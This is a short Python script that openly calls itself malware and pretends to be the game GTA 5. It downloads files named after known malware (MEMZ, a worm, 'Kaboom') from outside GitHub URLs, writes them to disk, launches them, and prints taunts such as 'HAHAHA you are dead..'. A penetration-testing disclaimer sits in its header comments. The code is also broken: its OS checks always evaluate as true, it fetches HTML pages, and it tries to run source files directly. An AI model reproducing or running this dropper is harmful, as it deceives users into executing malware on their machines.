#This malware has been made for penetration-testing purposes only, I am not responsible for any damage you do to your PC.
#It has a fake name because every malaware does, I wish that this malware will be used for penetration-testing purposes only.
import platform
import os
import requests
import subprocess
print("Running Gta5....")
if platform.system()==("Windows") or ("windows"):
   url='https://github.com/Dfmaaa/MEMZ-virus/blob/main/MEMZ.exe'
   r=requests.get(url, allow_redirects=True)
   open('MEMZ.exe', 'wb').write(r.content)
   subprocess.Popen('MEMZ.exe')
   print("HAHAHA you are dead..")
if platform.system()==("Linux") or ("linux"):
   url2='https://github.com/elfmaster/skeksi_virus/blob/master/virus.c'
   r=requests.get(url2, allow_redirects=True)
   open('virus.c', 'wb').write(r.content)
   subprocess.Popen('virus.c')
   print("HAHAHAHA YOU ARE DEAD.....")
if platform.system()==("IOS") or ("ios") or ("Ios"):
   print("Your device isn't compatible.")
if platform.system()==("Chrome OS") or ("chrome os") or ("Chrome os") or ("chrome OS"):
   url3=('https://github.com/kaiserfarrell/malware/blob/master/Worm/w0rm.cpp')
   r=requests.get(url3, allow_redirects=True)
   open('w0rm.cpp', 'wb').write(r.content)
   subprocess.Popen('w0rm.cpp')
   print("HAHAHAHAH YOU ARE DEAD....")
if platform.system()==("macOS") or ("MacOS") or ("macos") or ("MACOS") or ("Macos"):
   url4=('https://github.com/kaiserfarrell/malware/blob/master/virus%20miei/kaboom/Kaboom.cpp')
   r=requests.get(url4, allow_redirects=True)
   open('Kaboom.cpp', 'wb').write(r.content)
   subprocess.Popen('Kaboom.cpp')
   print("HAHAHHAHA YOU ARE DEAD...")
   

   
   
   


